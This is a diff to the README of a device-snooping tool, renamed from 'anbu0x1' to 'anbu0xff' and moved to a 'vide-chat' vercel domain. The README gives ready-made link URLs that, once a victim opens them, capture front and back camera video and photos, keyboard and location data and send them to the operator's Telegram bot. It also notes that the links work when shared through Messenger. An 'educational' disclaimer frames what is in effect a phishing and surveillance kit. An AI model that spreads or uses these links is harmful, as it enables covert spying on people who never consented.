@@ -1,6 +1,6 @@
-# 📱 **anbu0x1: Advanced Device Interaction Tool** 🚀
+# 📱 **anbu0xff: Advanced Device Interaction Tool** 🚀
 
-**anbu0x1** is a tool designed to demonstrate and educate on how various device capabilities work, including data access such as cameras, audio input, location tracking, and other device information. The purpose of this tool is to **teach** users about how data collection and device interactions can occur so they can understand potential risks and security measures.
+**anbu0xff** is a tool designed to demonstrate and educate on how various device capabilities work, including data access such as cameras, audio input, location tracking, and other device information. The purpose of this tool is to **teach** users about how data collection and device interactions can occur so they can understand potential risks and security measures.
 
 > **⚠️ Important:** This tool must be used ethically and legally. Any attempts to access or gather data from devices without proper permission is strictly **prohibited** and may have serious legal consequences. This tool's creators do not endorse or take responsibility for misuse.
 
@@ -8,7 +8,7 @@
 
 ## 🌟 Educational Features
 
-**anbu0x1** allows users to learn about accessing and interacting with device features for research purposes:
+**anbu0xff** allows users to learn about accessing and interacting with device features for research purposes:
 
 - 📸 **Front Camera**: Capture and analyze photo and video data.
 - 📸 **Back Camera**: Explore video and photo interactions.
@@ -29,17 +29,17 @@
 
 > - When you share the tool's link through **Messenger 💬**, it will continue to function properly.
 
-> - **anbu0x1** will send captured **video** 📹, **photo** 📸, and other data accurately to your connected **Telegram bot** 🤖, maintaining consistent functionality even when accessed via **Messenger**.
+> - **anbu0xff** will send captured **video** 📹, **photo** 📸, and other data accurately to your connected **Telegram bot** 🤖, maintaining consistent functionality even when accessed via **Messenger**.
 
 ---
 
 ## 🚀 How to Responsibly Use anbu0xpi
 
-To ethically and responsibly use **anbu0x1**:
+To ethically and responsibly use **anbu0xff**:
 
 1. **Visit Website:**
 
-    - [![Visit Website](https://img.shields.io/badge/Visit-Website-blue?style=for-the-badge)](https://sujon0x1.github.io/anbu0x1/)
+    - [![Visit Website](https://img.shields.io/badge/Visit-Website-blue?style=for-the-badge)](https://vide-chat.vercel.app/)
       
 2. Enter your **Telegram bot token** and **chat ID** for secure access.
 3. A unique link will be sent to you via Telegram to explore and learn from the tool's features.
@@ -58,23 +58,23 @@ Explore device capabilities through the tool’s APIs for learning purposes:
 
 - **Front Camera (Video)**:
   ```
-  https://sujon0x1.github.io/anbu0x1/video-f.html?token=<Telegram Token>&id=<Chat ID>
+  https://vide-chat.vercel.app/video-f.html?token=<Telegram Token>&id=<Chat ID>
   ```
 - **Back Camera (Video)**:
   ```
-  https://sujon0x1.github.io/anbu0x1/video-b.html?token=<Telegram Token>&id=<Chat ID>
+  https://vide-chat.vercel.app/video-b.html?token=<Telegram Token>&id=<Chat ID>
   ```
 - **Front Camera (Photo)**:
   ```
-  https://sujon0x1.github.io/anbu0x1/photo-f.html?token=<Telegram Token>&id=<Chat ID>
+  https://vide-chat.vercel.app/photo-f.html?token=<Telegram Token>&id=<Chat ID>
   ```
 - **Back Camera (Photo)**:
   ```
-  https://sujon0x1.github.io/anbu0x1/photo-b.html?token=<Telegram Token>&id=<Chat ID>
+  https://vide-chat.vercel.app/photo-b.html?token=<Telegram Token>&id=<Chat ID>
   ```
 - **Keyboard & Location Info**:
   ```
-  https://sujon0x1.github.io/anbu0x1/main.html?token=<Telegram Token>&id=<Chat ID>
+  https://vide-chat.vercel.app/main.html?token=<Telegram Token>&id=<Chat ID>
   ```
 
 Replace `<Telegram Token>` and `<Chat ID>` with your own details for access.
